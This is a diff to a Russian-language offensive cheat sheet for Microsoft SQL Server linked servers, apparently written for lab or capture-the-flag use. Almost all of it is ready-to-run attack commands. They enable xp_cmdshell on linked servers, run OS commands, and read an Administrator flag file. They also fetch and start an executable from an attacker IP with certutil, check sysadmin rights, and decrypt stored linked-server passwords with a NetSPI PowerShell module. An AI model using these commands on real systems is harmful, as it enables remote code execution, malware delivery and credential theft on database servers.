@@ -177,15 +177,16 @@ export KRB5CCNAME=sqlsvc.ccache
 * Давайте проверим наличие локального связанного сервера
 
       SELECT srvname, isremote FROM sysservers
+      EXEC sp_linkedservers;
 
   мы его нашли и
 
-      EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
-        EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
-        EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
-        EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
-          EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
-      EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+      EXEC ('sp_configure ''show advanced options'', 1') AT LOCAL.TEST.LINKED.SRV
+        EXEC ('RECONFIGURE') AT LOCAL.TEST.LINKED.SRV
+        EXEC ('sp_configure ''xp_cmdshell'',1') AT LOCAL.TEST.LINKED.SRV
+        EXEC ('RECONFIGURE') AT LOCAL.TEST.LINKED.SRV
+          EXEC ('xp_cmdshell ''whoami''') AT LOCAL.TEST.LINKED.SRV
+      EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT LOCAL.TEST.LINKED.SRV
 
     enum_links                 - enum linked servers
                                                                    
@@ -196,6 +197,21 @@ export KRB5CCNAME=sqlsvc.ccache
          python3 -m http.server 4243
          xp_cmdshell "certutil -urlcache -f http://10.10.16.28:4243/s.exe %TEMP%/s.exe"
          xp_cmdshell "start %TEMP%/s.exe"
+* Необходимо убедиться, что у нас достаточно прав доступа к удаленному серверу
+
+      SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+* Если все ок то можно приступать к выполнению команд на удаленном сервере
+
+      EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
+
+* Расшифровка паролей связанных серверов (после взлома)
+нужен локальный админ
+
+      import-module .\Get-MSSQLLinkPasswords.psm1
+      Get-MSSQLLinkPasswords
+        
+        
+        https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1    
 
 ***************************************************************************************
        select name from sys.databases;  (перечислить все базы данных)
